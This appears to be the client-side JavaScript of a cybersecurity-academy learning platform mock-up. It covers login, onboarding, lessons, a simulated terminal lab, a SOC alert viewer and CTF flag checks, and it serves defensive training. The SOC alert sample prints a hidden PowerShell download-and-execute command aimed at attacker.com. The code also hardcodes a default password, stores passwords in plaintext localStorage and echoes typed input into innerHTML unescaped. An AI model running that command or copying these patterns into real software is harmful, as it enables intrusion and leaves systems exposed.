/*
 * app.js
 * Technotama Cybersecurity Academy LMS Client-Side Interactive Engine
 */

// Application State Store
const appState = {
  user: {
    name: "Andi Wijaya",
    role: "student",
    careerGoal: "SOC Analyst",
    domicile: "Jakarta",
    education: "Undergraduate Student",
    background: "IT",
    experience: "beginner",
    skills: {
      networking: 80,
      linux: 90,
      threatAnalysis: 72,
      scripting: 54
    },
    xp: 1250,
    streak: 5,
    completedLabs: 6,
    completedChallenges: 1
  },
  onboarding: {
    currentStep: 1,
    careerSelected: "SOC Analyst",
    quizAnswers: {
      q1: null,
      q2: null,
      q3: null
    },
    currentQuizIndex: 1
  },
  activeCtfChallenge: null
};

// Initial setup on window load
window.addEventListener('load', () => {
  console.log("Technotama LMS System Engine initialized.");
});

// LOGIN & REGISTRATION HANDLERS
function showLoginError(message) {
  const errBox = document.getElementById('login-error-msg');
  const errText = document.getElementById('login-error-text');
  if (errBox && errText) {
    errText.textContent = message;
    errBox.style.display = 'flex';
  } else {
    alert(message);
  }
}

function handleLogin() {
  const emailInput = document.getElementById('login-username').value.trim();
  const passwordInput = document.getElementById('login-password').value.trim();
  
  const errBox = document.getElementById('login-error-msg');
  if (errBox) {
    errBox.style.display = 'none';
  }

  const correctPassword = localStorage.getItem('userPassword') || 'password123';

  // Real credential validation
  if (emailInput.toLowerCase() === 'andi.cyber' && passwordInput === correctPassword) {
    // If username is custom, update state (e.g. Andi Wijaya)
    appState.user.name = "Andi Wijaya";
    
    // Show spinner inside button
    const btn = document.querySelector('#login-form button[type="submit"]');
    const originalText = btn.innerHTML;
    btn.innerHTML = "<i class='fa-solid fa-spinner fa-spin'></i> Authenticating...";
    btn.disabled = true;
    
    setTimeout(() => {
      btn.innerHTML = originalText;
      btn.disabled = false;
      
      // Determine if password change is needed (first login or 3 months elapsed)
      const hasChangedFirstTime = localStorage.getItem('hasChangedPasswordFirstTime') === 'true';
      const lastChangedTimestamp = parseInt(localStorage.getItem('lastPasswordChangeTimestamp') || '0');
      const now = Date.now();
      const threeMonthsInMs = 90 * 24 * 60 * 60 * 1000;
      const elapsed = now - lastChangedTimestamp;
      const needsChange = !hasChangedFirstTime || (elapsed >= threeMonthsInMs);

      // Hide login screen
      document.getElementById('screen-login').classList.remove('active');
      
      if (needsChange) {
        // Transition to Change Password Screen
        document.getElementById('screen-change-password').classList.add('active');
        
        // Update display status
        const lastChangedEl = document.getElementById('pwd-last-changed-status');
        if (lastChangedEl) {
          if (lastChangedTimestamp > 0) {
            lastChangedEl.textContent = new Date(lastChangedTimestamp).toLocaleDateString('id-ID');
          } else {
            lastChangedEl.textContent = 'Belum pernah (Password Default)';
          }
        }
      } else {
        // Transition to Onboarding Wizard directly
        document.getElementById('screen-onboarding').classList.add('active');
      }
    }, 1000);
  } else {
    showLoginError("Email/Username atau Password salah! (Gunakan password baru Anda jika telah diganti).");
  }
}

// PASSWORD VISIBILITY TOGGLERS
function togglePasswordVisibility() {
  const pwdInput = document.getElementById('login-password');
  const toggleIcon = document.getElementById('password-toggle-icon');
  
  if (pwdInput && toggleIcon) {
    if (pwdInput.type === 'password') {
      pwdInput.type = 'text';
      toggleIcon.className = 'fa-solid fa-eye-slash';
    } else {
      pwdInput.type = 'password';
      toggleIcon.className = 'fa-solid fa-eye';
    }
  }
}

function toggleFieldPasswordVisibility(inputId, btnEl) {
  const pwdInput = document.getElementById(inputId);
  const toggleIcon = btnEl.querySelector('i');
  
  if (pwdInput && toggleIcon) {
    if (pwdInput.type === 'password') {
      pwdInput.type = 'text';
      toggleIcon.className = 'fa-solid fa-eye-slash';
    } else {
      pwdInput.type = 'password';
      toggleIcon.className = 'fa-solid fa-eye';
    }
  }
}

// CHANGE PASSWORD LOGIC
function handleChangePassword() {
  const oldPwd = document.getElementById('change-old-password').value;
  const newPwd = document.getElementById('change-new-password').value;
  const confirmPwd = document.getElementById('change-confirm-password').value;
  
  const errBox = document.getElementById('change-pwd-error');
  if (errBox) errBox.style.display = 'none';
  
  const correctPassword = localStorage.getItem('userPassword') || 'password123';
  
  if (oldPwd !== correctPassword) {
    showChangePwdError("Password lama tidak sesuai!");
    return;
  }
  
  if (newPwd.length < 8) {
    showChangePwdError("Password baru minimal harus 8 karakter!");
    return;
  }
  
  // Strength check: must contain letters and numbers
  const hasLetter = /[a-zA-Z]/.test(newPwd);
  const hasNumber = /[0-9]/.test(newPwd);
  if (!hasLetter || !hasNumber) {
    showChangePwdError("Password baru harus berupa kombinasi huruf dan angka!");
    return;
  }
  
  if (newPwd === oldPwd) {
    showChangePwdError("Password baru tidak boleh sama dengan password lama!");
    return;
  }
  
  if (newPwd !== confirmPwd) {
    showChangePwdError("Konfirmasi password baru tidak cocok!");
    return;
  }
  
  // Save credentials state
  localStorage.setItem('userPassword', newPwd);
  localStorage.setItem('hasChangedPasswordFirstTime', 'true');
  localStorage.setItem('lastPasswordChangeTimestamp', Date.now().toString());
  
  alert("Password berhasil diperbarui!");
  
  // Clear inputs
  document.getElementById('change-old-password').value = '';
  document.getElementById('change-new-password').value = '';
  document.getElementById('change-confirm-password').value = '';
  
  // Transition to Onboarding Wizard
  document.getElementById('screen-change-password').classList.remove('active');
  document.getElementById('screen-onboarding').classList.add('active');
}

function showChangePwdError(message) {
  const errBox = document.getElementById('change-pwd-error');
  const errText = document.getElementById('change-pwd-error-text');
  if (errBox && errText) {
    errText.textContent = message;
    errBox.style.display = 'flex';
  } else {
    alert(message);
  }
}

// SIMULATE 3 MONTHS EXPIRY FOR TESTING
function simulateThreeMonthsExpiry() {
  const ninetyOneDaysAgo = Date.now() - (91 * 24 * 60 * 60 * 1000);
  localStorage.setItem('lastPasswordChangeTimestamp', ninetyOneDaysAgo.toString());
  alert("Simulasi Berhasil! Timestamp perubahan password diset ke 91 hari yang lalu (Kadaluarsa).\nSilakan lakukan logout/refresh halaman lalu login kembali untuk mencoba pergantian password berkala.");
  
  const lastChangedEl = document.getElementById('pwd-last-changed-status');
  if (lastChangedEl) {
    lastChangedEl.textContent = new Date(ninetyOneDaysAgo).toLocaleDateString('id-ID') + " (Kadaluarsa)";
  }
}


// FORGOT PASSWORD MODAL HANDLERS
function openForgotPasswordModal() {
  const modal = document.getElementById('forgot-password-modal');
  const emailInput = document.getElementById('forgot-email');
  const successMsg = document.getElementById('forgot-password-success-msg');
  const form = document.getElementById('forgot-password-form');
  
  if (emailInput) emailInput.value = '';
  if (successMsg) successMsg.style.display = 'none';
  if (form) form.style.display = 'block';
  if (modal) modal.classList.add('active');
}

function closeForgotPasswordModal() {
  const modal = document.getElementById('forgot-password-modal');
  if (modal) modal.classList.remove('active');
}

function submitForgotPassword() {
  const emailVal = document.getElementById('forgot-email').value.trim();
  if (!emailVal) return;
  
  const submitBtn = document.getElementById('btn-submit-forgot');
  const originalText = submitBtn.innerHTML;
  submitBtn.disabled = true;
  submitBtn.innerHTML = "<i class='fa-solid fa-spinner fa-spin'></i> Mengirim...";
  
  setTimeout(() => {
    submitBtn.disabled = false;
    submitBtn.innerHTML = originalText;
    
    // Show success message, hide form
    document.getElementById('forgot-password-success-msg').style.display = 'flex';
    document.getElementById('forgot-password-form').style.display = 'none';
  }, 1200);
}


function handleRegister() {
  const nameInput = document.getElementById('reg-name').value;
  if (nameInput) {
    appState.user.name = nameInput;
  }
  
  document.getElementById('screen-register').classList.remove('active');
  document.getElementById('screen-onboarding').classList.add('active');
}

// ONBOARDING WIZARD ROUTING
function changeOnboardingStep(stepNumber) {
  // Hide current active onboarding views
  document.querySelectorAll('.onboarding-step-view').forEach(view => {
    view.classList.remove('active');
  });
  
  // Show new step view
  document.getElementById(`onboarding-step-${stepNumber}`).classList.add('active');
  
  // Update stepper active classes
  for (let i = 1; i <= 5; i++) {
    const node = document.getElementById(`step-node-${i}`);
    if (i < stepNumber) {
      node.className = "step-node completed";
    } else if (i === stepNumber) {
      node.className = "step-node active";
    } else {
      node.className = "step-node";
    }
  }
  
  appState.onboarding.currentStep = stepNumber;
}

// Career role selector inside onboarding Step 3
function selectCareerOption(element) {
  document.querySelectorAll('.career-option').forEach(opt => {
    opt.classList.remove('selected');
  });
  element.classList.add('selected');
  appState.onboarding.careerSelected = element.getAttribute('data-role');
}

// Placement quiz answers collector inside onboarding Step 4
function selectQuizAnswer(questionIndex, answerCode, element) {
  const options = element.parentElement.querySelectorAll('.quiz-option-btn');
  options.forEach(btn => btn.classList.remove('selected'));
  element.classList.add('selected');
  
  appState.onboarding.quizAnswers[`q${questionIndex}`] = answerCode;
}

function nextQuizQuestion() {
  const currentIndex = appState.onboarding.currentQuizIndex;
  
  // Verify answer selection
  if (!appState.onboarding.quizAnswers[`q${currentIndex}`]) {
    alert("Please select an answer option before moving forward.");
    return;
  }
  
  if (currentIndex < 3) {
    // Hide current question, show next
    document.getElementById(`q${currentIndex}`).style.display = 'none';
    const nextIndex = currentIndex + 1;
    document.getElementById(`q${nextIndex}`).style.display = 'block';
    
    appState.onboarding.currentQuizIndex = nextIndex;
    document.getElementById('quiz-progress-badge').textContent = `Question ${nextIndex} of 3`;
    
    if (nextIndex === 3) {
      document.getElementById('btn-quiz-next').innerHTML = "Finish Assessment <i class='fa-solid fa-square-check'></i>";
    }
  } else {
    // Complete assessment, route to recommendation
    changeOnboardingStep(5);
  }
}

// Complete onboarding flow, setup profile & main app
function completeOnboarding() {
  // Bind inputs to profile
  appState.user.domicile = document.getElementById('onb-domicile').value || "Jakarta";
  appState.user.education = document.getElementById('onb-education').value;
  appState.user.background = document.getElementById('onb-background').value;
  appState.user.experience = document.getElementById('onb-experience').value;
  appState.user.careerGoal = appState.onboarding.careerSelected;

  // Update dynamic values in DOM
  document.getElementById('app-username').textContent = appState.user.name;
  document.getElementById('app-userrole').textContent = `Student (${appState.user.careerGoal})`;
  document.getElementById('welcome-text').textContent = `Good morning, ${appState.user.name}`;
  document.getElementById('prof-name').textContent = appState.user.name;

  // Toggle layout containers
  document.getElementById('screen-onboarding').classList.remove('active');
  document.getElementById('main-layout').style.display = 'flex';
  
  // Reset navigation to default Dashboard view
  showScreenDirect('dashboard');
}

// NAVIGATION SYSTEM (SIDEBAR & BOTTOM TABS)
function navigateTo(viewName, element) {
  // Set all links in sidebar & bottom nav as inactive
  document.querySelectorAll('.nav-link, .mobile-nav-item').forEach(link => {
    link.classList.remove('active');
  });
  
  // Highlight active selector
  element.classList.add('active');
  
  // Trigger screen switch
  showScreenDirect(viewName);
}

function showScreenDirect(viewId) {
  // Hide all screens in content panel
  document.querySelectorAll('#page-content > .screen').forEach(screen => {
    screen.classList.remove('active');
  });
  
  // Show target screen
  const targetView = document.getElementById(`view-${viewId}`);
  if (targetView) {
    targetView.classList.add('active');
  } else {
    console.warn(`View screen 'view-${viewId}' not found.`);
  }

  // Update sidebar active link matching targetView
  document.querySelectorAll('.nav-link').forEach(link => {
    const clickAttr = link.getAttribute('onclick') || "";
    if (clickAttr.includes(`'${viewId}'`)) {
      document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
      link.classList.add('active');
    }
  });

  // Ensure notification tray collapses on transitions
  document.getElementById('notification-tray').classList.remove('active');
}

// Quick links / generic screen transition helpers
function showScreen(screenType) {
  document.querySelectorAll('.auth-container, .screen').forEach(sc => {
    sc.classList.remove('active');
  });
  
  if (screenType === 'login') {
    document.getElementById('screen-login').classList.add('active');
  } else if (screenType === 'register') {
    document.getElementById('screen-register').classList.add('active');
  }
}

// Collapsing/Expanding sidebar panel
function toggleSidebar() {
  const sidebar = document.getElementById('sidebar');
  const mainContent = document.getElementById('main-content');
  const toggleIcon = document.getElementById('sidebar-toggle-icon');
  
  sidebar.classList.toggle('collapsed');
  mainContent.classList.toggle('collapsed');
  
  if (sidebar.classList.contains('collapsed')) {
    toggleIcon.className = "fa-solid fa-angles-right";
  } else {
    toggleIcon.className = "fa-solid fa-angles-left";
  }
}

// ROLE BASED SWITCHER
function switchRole(role) {
  console.log(`Role switching to: ${role}`);
  appState.user.role = role;
  
  if (role === 'student') {
    showScreenDirect('dashboard');
  } else if (role === 'instructor') {
    showScreenDirect('instructor-dashboard');
  } else if (role === 'assessor') {
    showScreenDirect('assessor-dashboard');
  } else if (role === 'admin') {
    showScreenDirect('admin-dashboard');
  }
}

// NOTIFICATIONS TRAY & HUB HANDLERS
function toggleNotificationTray() {
  document.getElementById('notification-tray').classList.toggle('active');
}

function markAllNotificationsRead() {
  document.querySelectorAll('.notification-item').forEach(item => {
    item.classList.remove('unread');
  });
  document.querySelector('.icon-btn .badge-dot').style.display = 'none';
}

function handleNotificationClick(type) {
  document.getElementById('notification-tray').classList.remove('active');
  if (type === 'lab') {
    showScreenDirect('cyber-lab');
  } else if (type === 'mentor') {
    showScreenDirect('assessments');
  } else if (type === 'career') {
    showScreenDirect('career-center');
  }
}

// LESSON PLAYER & VIDEO MANAGEMENT
function loadLesson(lessonKey) {
  // Update sidebar active lesson styles
  const items = document.querySelectorAll('.lesson-sidebar .lesson-link');
  items.forEach(item => item.classList.remove('active'));
  
  // Find element containing specific key and set active
  const target = Array.from(items).find(el => el.getAttribute('onclick').includes(`'${lessonKey}'`));
  if (target) target.classList.add('active');

  const mainArea = document.getElementById('lesson-main-content');
  
  if (lessonKey === 'handshake') {
    mainArea.innerHTML = `
      <div id="lesson-video-player">
        <h2 style="margin-bottom: 12px;">2. TCP Handshake Theory & Flag Mechanics</h2>
        
        <div class="video-placeholder">
          <div class="video-overlay-info">
            <h3>TCP Connection Management</h3>
            <p>Instructor: Erika Pratiwi (09:42 / 12:15)</p>
          </div>
          <button class="video-play-btn"><i class="fa-solid fa-play"></i></button>
        </div>
        
        <div class="tab-container">
          <div class="tab-nav">
            <button class="tab-link active" onclick="toggleLessonTab('notes')">Lecture Notes</button>
            <button class="tab-link" onclick="toggleLessonTab('resources')">Resources</button>
          </div>
          
          <div class="tab-content active" id="lesson-tab-notes">
            <p style="margin-bottom: 16px;">
              The Transmission Control Protocol (TCP) uses a three-way handshake to establish a reliable connection.
              This process ensures both client and server are synchronized and ready to exchange IP packets.
            </p>
            <div style="background-color: var(--gray-100); padding: 16px; border-radius: var(--radius-md); font-family: var(--font-mono); font-size: 13px;">
              Step 1: Client sends SYN (Synchronize sequence number)<br>
              Step 2: Server responds with SYN-ACK (Acknowledge and Syn sequence number)<br>
              Step 3: Client responds with ACK (Acknowledge sequence)
            </div>
          </div>
        </div>
      </div>
    `;
  } else if (lessonKey === 'reading') {
    mainArea.innerHTML = `
      <div>
        <span class="badge badge-blue" style="margin-bottom: 12px;">Reading Module</span>
        <h2 style="margin-bottom: 16px;">3. Network Packet Header Anatomy</h2>
        
        <div style="font-size: 15px; line-height: 1.7; color: var(--gray-700);">
          <p style="margin-bottom: 16px;">
            Every packet sent across an IP network contains structural metadata organized into headers. 
            Understanding the layout of IP and TCP headers is critical for identifying suspicious traffic sequences.
          </p>
          <h3 style="margin: 24px 0 12px 0; font-size: 18px;">IP Header Key Fields</h3>
          <ul style="margin-left: 24px; margin-bottom: 24px; display: flex; flex-direction: column; gap: 8px;">
            <li><strong>Source IP Address:</strong> The 32-bit (IPv4) identifier of the sender machine.</li>
            <li><strong>Destination IP Address:</strong> The 32-bit identifier of the recipient machine.</li>
            <li><strong>Time-to-Live (TTL):</strong> Decrement counter designed to prevent loops.</li>
          </ul>
        </div>
        <button class="btn btn-primary" onclick="loadLesson('handshake')" style="margin-top:24px;"><i class="fa-solid fa-chevron-left"></i> Previous Video</button>
      </div>
    `;
  } else if (lessonKey === 'intro') {
    mainArea.innerHTML = `
      <div>
        <h2 style="margin-bottom: 12px;">1. Course Overview Introduction</h2>
        <div class="video-placeholder">
          <div class="video-overlay-info">
            <h3>Course Path Alignment</h3>
            <p>Instructor: Erika Pratiwi (03:00 / 03:00)</p>
          </div>
          <button class="video-play-btn" style="background-color: var(--success);"><i class="fa-solid fa-check"></i></button>
        </div>
        <p style="margin-top: 16px; font-size:14px; color:var(--gray-600);">Introduction video detailing course goals and expected output competencies.</p>
      </div>
    `;
  }
}

function toggleLessonTab(tabId) {
  document.querySelectorAll('.lesson-content-area .tab-link').forEach(link => {
    link.classList.remove('active');
  });
  document.querySelectorAll('.lesson-content-area .tab-content').forEach(content => {
    content.classList.remove('active');
  });
  
  const activeTab = Array.from(document.querySelectorAll('.lesson-content-area .tab-link')).find(el => el.textContent.toLowerCase().includes(tabId));
  if (activeTab) activeTab.classList.add('active');
  
  const element = document.getElementById(`lesson-tab-${tabId}`);
  if (element) element.classList.add('active');
}

// CYBER RANGE ENVIRONMENT SIMULATOR (Screen 13 Console)
let activeRangeLab = '';
function launchLabSimulation(labName) {
  activeRangeLab = labName;
  showScreenDirect('cyber-range');
  
  // Reset terminal console
  const term = document.getElementById('range-terminal-output');
  term.innerHTML = `
    <div class="terminal-line">[SYSTEM] Sandbox initialized successfully.</div>
    <div class="terminal-line">[SYSTEM] Virtual machine instance online. Target IP: 10.0.12.82</div>
    <div class="terminal-line">[SYSTEM] Captures directory loaded at /home/kali/captures/</div>
    <div class="terminal-line"><span class="terminal-prompt">kali@technotama:~$</span> ls</div>
    <div class="terminal-line">capture.pcap</div>
    <div class="terminal-line" id="terminal-cursor-line"><span class="terminal-prompt">kali@technotama:~$</span> <span id="terminal-input-display"></span><span style="animation: blink 1s infinite;">|</span></div>
  `;
}

function handleTerminalCommand(event) {
  if (event.key === 'Enter') {
    const inputField = document.getElementById('terminal-cli-input');
    const command = inputField.value.trim();
    inputField.value = '';
    
    if (!command) return;

    // Log the typed command in the prompt log
    const term = document.getElementById('range-terminal-output');
    const cursorLine = document.getElementById('terminal-cursor-line');
    
    // Remove old cursor line
    if (cursorLine) cursorLine.remove();
    
    term.innerHTML += `<div class="terminal-line"><span class="terminal-prompt">kali@technotama:~$</span> ${command}</div>`;
    
    // Process mock command output
    let output = '';
    const cmdTokens = command.toLowerCase().split(' ');
    const primaryCmd = cmdTokens[0];
    
    if (primaryCmd === 'ls') {
      output = `total 2048<br>drwxr-xr-x 2 kali kali    4096 Jul 28 14:00 .<br>-rw-r--r-- 1 kali kali 2097152 Jul 28 14:00 capture.pcap`;
    } else if (primaryCmd === 'whoami') {
      output = `kali`;
    } else if (primaryCmd === 'nmap') {
      output = `Starting Nmap 7.93 ( https://nmap.org ) at 2026-07-28 21:12 WIB<br>
Nmap scan report for 10.0.12.82<br>
Host is up (0.00045s latency).<br>
Not shown: 998 closed tcp ports (conn-refused)<br>
PORT   STATE SERVICE VERSION<br>
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1<br>
80/tcp open  http    Apache httpd 2.4.56<br>
Service info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`;
    } else if (primaryCmd === 'tshark') {
      output = `  1   0.000000   10.0.12.5 &rarr; 10.0.12.82   TCP 74 58492 &rarr; 80 [SYN] Seq=0 Win=64240<br>
  2   0.000451  10.0.12.82 &rarr; 10.0.12.5    TCP 74 80 &rarr; 58492 [SYN, ACK] Seq=0 Ack=1 Win=65160<br>
  3   0.000922   10.0.12.5 &rarr; 10.0.12.82   TCP 66 58492 &rarr; 80 [ACK] Seq=1 Ack=1 Win=64240<br>
  4   0.002154   10.0.12.5 &rarr; 10.0.12.82   HTTP 150 POST /login.php HTTP/1.1 (application/x-www-form-urlencoded)<br>
  5   0.003921  10.0.12.82 &rarr; 10.0.12.5    HTTP 120 HTTP/1.1 200 OK (text/html)<br>
  [INFO] Connection credentials leaked. Use tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e http.file_data to extract payload.`;
    } else if (command.includes('http.file_data')) {
      output = `username=admin&password=FLAG{wireshark_packet_hunter_994}&submit=Login`;
    } else if (primaryCmd === 'help') {
      output = `Available simulated commands: ls, whoami, nmap, tshark, clear, help`;
    } else if (primaryCmd === 'clear') {
      term.innerHTML = '';
    } else {
      output = `bash: ${primaryCmd}: command not found. Try typing 'help' to see available options.`;
    }
    
    if (output) {
      term.innerHTML += `<div class="terminal-line">${output}</div>`;
    }
    
    // Append cursor line back
    term.innerHTML += `<div class="terminal-line" id="terminal-cursor-line"><span class="terminal-prompt">kali@technotama:~$</span> <span id="terminal-input-display"></span><span style="animation: blink 1s infinite;">|</span></div>`;
    
    // Auto-scroll terminal container
    term.scrollTop = term.scrollHeight;
  }
}

function submitRangeFlag() {
  const flagInput = document.getElementById('range-flag-input').value.trim();
  if (flagInput === 'FLAG{wireshark_packet_hunter_994}') {
    alert("CRITICAL VICTORY! Flag Correct. You have completed the Wireshark Packet Analysis Lab!");
    appState.user.xp += 200;
    appState.user.completedLabs += 1;
    // Add completed style to list node in path
    showScreenDirect('dashboard');
  } else {
    alert("INCORRECT FLAG. Analyze the connection packet credentials and query output data again.");
  }
}

function resetLabSimulation() {
  document.getElementById('range-flag-input').value = '';
  launchLabSimulation(activeRangeLab);
}

// SOC MINI SIEM INCIDENT MANAGER
function selectSocAlert(alertId, element) {
  // Remove selection outline
  document.querySelectorAll('.soc-alert-item').forEach(item => {
    item.classList.remove('selected');
  });
  element.classList.add('selected');
  
  const pane = document.getElementById('soc-investigation-details');
  
  if (alertId === 'alert-1') {
    pane.innerHTML = `
      <h3 style="border-bottom:1px solid var(--gray-200); padding-bottom:12px; margin-bottom:16px;">Alert Details</h3>
      <div style="margin-bottom:16px;">
        <label class="form-label" style="font-weight:700;">Event Name</label>
        <div style="font-size:15px; font-weight:600; color:var(--navy-deep);">Suspicious PowerShell Download Script</div>
      </div>
      
      <div class="grid-2" style="margin-bottom:16px;">
        <div>
          <label class="form-label">Mitre Tactic</label>
          <span class="badge badge-blue">TA0002 Execution</span>
        </div>
        <div>
          <label class="form-label">Trigger Tool</label>
          <code style="font-family:var(--font-mono); font-size:12px; background:var(--gray-100); padding:2px 6px; border-radius:4px;">PowerShell.exe</code>
        </div>
      </div>

      <div style="margin-bottom:20px;">
        <label class="form-label">Payload Command String</label>
        <textarea class="form-control" style="font-family:var(--font-mono); font-size:12px; height:80px; background:var(--gray-900); color:#9ece6a;" readonly>
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
        </textarea>
      </div>

      <h4 style="margin-bottom:12px;">Investigation Timeline</h4>
      <div class="timeline-flow" style="margin-bottom:24px;">
        <div class="timeline-node success">
          <div style="font-size:12px; font-weight:700;">System Event Log (Win Event 4688)</div>
          <div style="font-size:11px; color:var(--gray-500);">Process Creation triggered by Service Account.</div>
        </div>
        <div class="timeline-node success">
          <div style="font-size:12px; font-weight:700;">Network Security Monitor alert</div>
          <div style="font-size:11px; color:var(--gray-500);">HTTP request made to attacker.com domain.</div>
        </div>
      </div>

      <button class="btn btn-primary" style="width:100%;" onclick="escalateIncident()">Escalate Incident to Tier-2</button>
    `;
  } else if (alertId === 'alert-2') {
    pane.innerHTML = `
      <h3 style="border-bottom:1px solid var(--gray-200); padding-bottom:12px; margin-bottom:16px;">Alert Details</h3>
      <div style="margin-bottom:16px;">
        <label class="form-label" style="font-weight:700;">Event Name</label>
        <div style="font-size:15px; font-weight:600; color:var(--navy-deep);">Multiple Failed Login Attempts (Brute Force)</div>
      </div>
      
      <div class="grid-2" style="margin-bottom:16px;">
        <div>
          <label class="form-label">Mitre Tactic</label>
          <span class="badge badge-blue">TA0006 Credential Access</span>
        </div>
        <div>
          <label class="form-label">Trigger Protocol</label>
          <code style="font-family:var(--font-mono); font-size:12px; background:var(--gray-100); padding:2px 6px; border-radius:4px;">RDP (Port 3389)</code>
        </div>
      </div>

      <div style="margin-bottom:20px;">
        <label class="form-label">Trigger Condition</label>
        <div style="font-size:13px; color:var(--gray-700);">45 failed login attempts recorded within a 10-second interval for account: <code>administrator</code>.</div>
      </div>

      <h4 style="margin-bottom:12px;">Investigation Timeline</h4>
      <div class="timeline-flow" style="margin-bottom:24px;">
        <div class="timeline-node success">
          <div style="font-size:12px; font-weight:700;">Host Event ID 4625</div>
          <div style="font-size:11px; color:var(--gray-500);">An account failed to log on. Logon Type: 3 (Network).</div>
        </div>
      </div>

      <button class="btn btn-primary" style="width:100%;" onclick="escalateIncident()">Block Source IP Endpoint</button>
    `;
  } else if (alertId === 'alert-3') {
    pane.innerHTML = `
      <h3 style="border-bottom:1px solid var(--gray-200); padding-bottom:12px; margin-bottom:16px;">Alert Details</h3>
      <div style="margin-bottom:16px;">
        <label class="form-label" style="font-weight:700;">Event Name</label>
        <div style="font-size:15px; font-weight:600; color:var(--navy-deep);">Unusual DNS Outbound Tunneling Query</div>
      </div>
      
      <div class="grid-2" style="margin-bottom:16px;">
        <div>
          <label class="form-label">Mitre Tactic</label>
          <span class="badge badge-blue">TA0011 Exfiltration</span>
        </div>
        <div>
          <label class="form-label">Destination IP</label>
          <code style="font-family:var(--font-mono); font-size:12px; background:var(--gray-100); padding:2px 6px; border-radius:4px;">198.51.100.82</code>
        </div>
      </div>

      <div style="margin-bottom:20px;">
        <label class="form-label">DNS Request String</label>
        <code style="font-family:var(--font-mono); font-size:12px; background:var(--gray-900); color:#9ece6a; padding:6px; display:block;">
          base64encodeddatabuffer.tunneldomain.com
        </code>
      </div>

      <button class="btn btn-primary" style="width:100%;" onclick="escalateIncident()">Quarantine Host Machine</button>
    `;
  }
}

function escalateIncident() {
  alert("INCIDENT MITIGATED! Action logged in Incident Tracker. Competency points updated (+15 XP).");
  appState.user.xp += 50;
  showScreenDirect('dashboard');
}

// CTF JEOPARDY FLAG TRIGGER
function launchCtfSimulator(challengeName) {
  appState.activeCtfChallenge = challengeName;
  document.getElementById('ctf-modal-title').textContent = `Capture Flag: ${challengeName}`;
  document.getElementById('ctf-flag-input').value = '';
  document.getElementById('ctf-modal').classList.add('active');
}

function closeCtfSimulator() {
  document.getElementById('ctf-modal').classList.remove('active');
}

function submitCtfFlag() {
  const flag = document.getElementById('ctf-flag-input').value.trim();
  
  if (flag === 'FLAG{metadata_leaked_8021}' && appState.activeCtfChallenge.includes('Metadata')) {
    alert("CORRECT FLAG SUBMISSION! 100 points added to scoreboard!");
    appState.user.xp += 100;
    appState.user.completedChallenges += 1;
    closeCtfSimulator();
    showScreenDirect('dashboard');
  } else if (flag === 'FLAG{admin_sqli_bypass}' && appState.activeCtfChallenge.includes('SQLi')) {
    alert("CORRECT FLAG SUBMISSION! 250 points added to scoreboard!");
    appState.user.xp += 250;
    appState.user.completedChallenges += 1;
    closeCtfSimulator();
    showScreenDirect('dashboard');
  } else {
    alert("INVALID CREDENTIAL FLAG. Review target dumps or payload and input again.");
  }
}

// CREDENTIALS WALLET SWITCH TABS
function toggleCredentialTab(tabId) {
  document.querySelectorAll('#view-credentials .tab-link').forEach(link => {
    link.classList.remove('active');
  });
  document.querySelectorAll('#view-credentials .tab-content').forEach(content => {
    content.classList.remove('active');
  });
  
  const activeTab = Array.from(document.querySelectorAll('#view-credentials .tab-link')).find(el => el.textContent.toLowerCase().includes(tabId));
  if (activeTab) activeTab.classList.add('active');
  
  document.getElementById(`credential-tab-${tabId}`).classList.add('active');
}
